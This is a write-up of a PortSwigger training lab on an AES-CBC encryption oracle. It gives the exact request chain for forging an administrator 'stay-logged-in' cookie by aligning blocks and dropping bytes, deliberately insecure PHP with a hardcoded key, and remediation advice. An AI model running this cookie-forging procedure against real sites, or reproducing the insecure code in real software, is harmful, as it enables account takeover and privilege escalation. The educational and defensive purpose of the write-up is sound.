# [PortSwigger Lab] AES-CBC Encryption Oracle & Block Alignment Vulnerability

## 1. Vulnerability Details

| Parameter | Details |
| :--- | :--- |
| **Vulnerability Type** | Cryptographic Flaw / Encryption Oracle & Block Alignment (CBC/AES Slicing) |
| **Affected Endpoint** | `POST /post/comment`, `GET /my-account`, `POST /login` |
| **Affected Parameter** | `notification` cookie, `stay-logged-in` cookie, `email` |
| **Root Cause** | The application reuses the same symmetric AES key for both trivial notification error messages and critical authentication cookies (`stay-logged-in`) without verifying ciphertext integrity using a MAC/HMAC mechanism. |

---

## 2. Root Cause & Attack Logic

- **Root Cause:** Symmetric key reuse combined with an Encryption Oracle pattern. The application encrypts user-supplied input and reflects it back to the client while lacking authenticated encryption (AEAD/HMAC), allowing ciphertext block slicing without triggering decryption errors.
- **Attack Logic:**
  1. Authenticate with `wiener:peter` and select "Stay logged in" to obtain a valid session cookie.
  2. Decrypt the session structure via the `notification` cookie reflector to confirm the expected plaintext format: `username:timestamp` (e.g., `wiener:1789545518956`).
  3. Prepend 9 filler bytes (`xxxxxxxxx`) to the server's error prefix (`Invalid email address: ` - 23 bytes), aligning the prefix exactly to 32 bytes (2 complete AES blocks).
  4. Submit the target payload `xxxxxxxxxadministrator:1789545518956` via the email/comment field to generate encrypted ciphertext where the target `administrator` string aligns perfectly at the start of the 3rd block.
  5. Process the encrypted `notification` cookie in CyberChef: URL/Base64 decode, drop the first 32 bytes (2 blocks), and re-encode the remaining ciphertext.
  6. Inject the manipulated 3rd block into the `stay-logged-in` cookie to elevate privileges to `administrator` and delete user `carlos`.

---

## 3. Code Structure Analysis

```php
// INSECURE CODE (Key Reuse, Encryption Oracle & Missing Integrity Checks):
define('SECRET_KEY', 'static_aes_key_12345');

function encrypt_data($data) {
    // Unauthenticated AES-CBC Encryption (No HMAC or Auth Tag!)
    return openssl_encrypt($data, 'AES-128-CBC', SECRET_KEY, 0, $GLOBALS['iv']);
}

// Low-privilege error reflector creates an Encryption Oracle:
if ($invalid_email) {
    $msg = "Invalid email address: " . $_POST['email'];
    setcookie('notification', encrypt_data($msg)); // Oracle created!
}

// Session management reuses the EXACT same key:
if ($login_success && $_POST['remember']) {
    $session_data = $user . ":" . time();
    setcookie('stay-logged-in', encrypt_data($session_data));
}

// SECURE CODE (Isolated Keys & Authenticated Encryption - AES-GCM):
define('SESSION_KEY', 'session_specific_key_abc987');
define('NOTIF_KEY', 'notification_specific_key_xyz321');

function encrypt_authenticated($data, $key) {
    // AES-GCM provides confidentiality and integrity (Auth Tag)
    $ciphertext = openssl_encrypt($data, 'aes-128-gcm', $key, 0, $iv, $tag);
    return base64_encode($iv . $tag . $ciphertext); 
}

// 1. Enforce strict key separation across application modules.
// 2. Modifying ciphertext (e.g., dropping bytes) invalidates the Auth Tag and rejects the request.
```

---

## 4. PoC Payload & HTTP Request/Response

### Execution Chain (Step-by-Step)
1. `POST /login` -> `username=wiener&password=peter&stay-logged-in=on`
2. `GET /my-account` -> Test `notification` cookie reflector with `stay-logged-in` payload.
3. `POST /post/comment` -> `email=xxxxxxxxxadministrator:1789545518956`
4. **CyberChef Pipeline:** `URL Decode` -> `From Base64` -> `Drop bytes (32)` -> `To Base64` -> `URL Encode`
5. `GET /my-account` -> `Cookie: stay-logged-in=<cyberchef_output>`
6. `POST /admin/delete` -> `username=carlos` (Admin Privilege Escalation)

### Expected Response Status Chain
1. `HTTP/2 302 Found` (Successful login, `stay-logged-in` cookie issued)
2. `HTTP/2 200 OK` (Reflected decrypted plaintext: "Invalid email address: wiener:1789545518956")
3. `HTTP/2 302 Found` (Set-Cookie: `notification` generated containing target block)
4. CyberChef Operations (First 32 bytes / 2 blocks dropped; isolated admin block produced)
5. `HTTP/2 200 OK` (Session authenticated as `administrator`)
6. `HTTP/2 302 Found` (User `carlos` successfully deleted - Lab Solved)

---

## 5. Mechanism Analysis (Why it Worked)

- **Encryption Oracle Architecture:** Reflecting user-controlled data encrypted on the server side via the `notification` cookie provided an unauthenticated encryption mechanism to craft arbitrary ciphertexts.
- **Block Alignment & Slicing (AES-CBC):** Due to AES's fixed 16-byte block structure, padding the 23-byte prefix with 9 filler bytes completed 32 bytes (2 full blocks), aligning `administrator:<timestamp>` precisely at the start of the 3rd block boundary.
- **Lack of Authenticated Encryption (No MAC/AEAD):** Slicing the first 32 bytes from the ciphertext allowed the server to decrypt the truncated 3rd block as valid `administrator:<timestamp>` plaintext without raising an integrity/MAC error.

---

## 6. Remediation Strategy

- **Separate Cryptographic Keys:** Never reuse symmetric keys across different application domains or functional modules.
- **Authenticated Encryption (AEAD):** Enforce AEAD modes like AES-GCM or apply an Encrypt-then-MAC (HMAC-SHA256) pattern to guarantee ciphertext integrity.
- **Eliminate Encryption Reflectors:** Avoid architectural designs that reflect user-controlled input as encrypted cookies or tokens back to the client.

---

## 7. Discovery & Inspection Path (DevTools & Burp Navigation)

1. Authenticate with `wiener:peter`, ensuring "Remember me" is checked, then copy the generated `stay-logged-in` cookie value.
2. In Burp Repeater, add `; notification=` to any request and paste the `stay-logged-in` cookie value (URL-encode with `Ctrl + U`).
3. Verify decryption format from response output (`Invalid email address: wiener:1789545518956`).
4. Calculate offset: 23-byte prefix requires 9 filler bytes (`xxxxxxxxx`) to hit 32 bytes. Append target string: `xxxxxxxxxadministrator:1789545518956`.
5. Submit payload via comment/email field and copy the issued `Set-Cookie: notification=...` header from Burp HTTP History.
6. **CyberChef Operations:**
   - **Input:** Paste encrypted `notification` string.
   - `URL Decode`
   - `From Base64`
   - `Drop bytes` (Apply to: Bytes, Length: 32)
   - `To Base64`
   - `URL Encode`
   - **Output:** Copy processed ciphertext string.
7. Clear existing cookies in Burp Repeater on `GET /my-account`, set `Cookie: stay-logged-in=<CYBERCHEF_OUTPUT>`, and send request to confirm administrator access.
8. Issue request to `/admin/delete?username=carlos` to delete user `carlos` and complete target execution.
